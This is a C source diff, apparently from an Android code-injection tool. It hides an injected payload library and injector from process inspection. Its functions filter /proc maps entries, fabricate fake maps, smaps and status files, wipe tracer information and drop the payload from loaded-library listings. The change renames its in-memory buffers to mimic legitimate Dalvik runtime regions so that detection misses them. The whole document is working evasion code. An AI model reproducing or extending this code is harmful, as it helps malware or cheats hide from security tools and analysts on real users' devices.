@@ -212,8 +212,8 @@ static bool hide_maps_line(const char *line) {
     OBF_DECODE(pay,  "libzx_payload.so");
     OBF_DECODE(inj,  "zx_injector");
     OBF_DECODE(pfx,  "zx_payload");
-    OBF_DECODE(mfd,  "memfd:zx");
-    OBF_DECODE(tmp,  "zxpl_");
+    OBF_DECODE(mfd,  "memfd:jit-zygote-cache");
+    OBF_DECODE(tmp,  "libdns_");
     if (strstr(line, pay) || strstr(line, inj) || strstr(line, pfx) ||
         strstr(line, mfd) || strstr(line, tmp))
         return true;
@@ -242,7 +242,7 @@ static void zero_tracer(char *line) {
 }
 
 static int build_fake_maps(int real_fd) {
-    int mfd = (int)syscall(__NR_memfd_create, "zxm", 0);
+    int mfd = (int)syscall(__NR_memfd_create, "dalvik-jit-code-cache", 0);
     if (mfd < 0) return -1;
     FILE *f = fdopen(dup(real_fd), "r");
     close(real_fd);
@@ -258,7 +258,7 @@ static int build_fake_maps(int real_fd) {
 }
 
 static int build_fake_smaps(int real_fd) {
-    int mfd = (int)syscall(__NR_memfd_create, "zxs", 0);
+    int mfd = (int)syscall(__NR_memfd_create, "dalvik-code-cache", 0);
     if (mfd < 0) return -1;
     FILE *f = fdopen(dup(real_fd), "r");
     close(real_fd);
@@ -280,7 +280,7 @@ static int build_fake_smaps(int real_fd) {
 }
 
 static int build_fake_status(int real_fd) {
-    int mfd = (int)syscall(__NR_memfd_create, "zxt", 0);
+    int mfd = (int)syscall(__NR_memfd_create, "dalvik-large-object-space", 0);
     if (mfd < 0) return -1;
     FILE *f = fdopen(dup(real_fd), "r");
     close(real_fd);
@@ -392,8 +392,8 @@ static int dl_iter_filter(struct dl_phdr_info *info, size_t sz, void *arg) {
     // Hide our payload by name patterns
     OBF_DECODE(pay,  "libzx_payload.so");
     OBF_DECODE(pfx,  "zx_payload");
-    OBF_DECODE(mfd1, "memfd:zx");
-    OBF_DECODE(tmp1, "zxpl_");
+    OBF_DECODE(mfd1, "memfd:jit-zygote-cache");
+    OBF_DECODE(tmp1, "libdns_");
     if (strstr(name, pay)  || strstr(name, pfx) ||
         strstr(name, mfd1) || strstr(name, tmp1))
         return 0;  // skip — invisible to caller
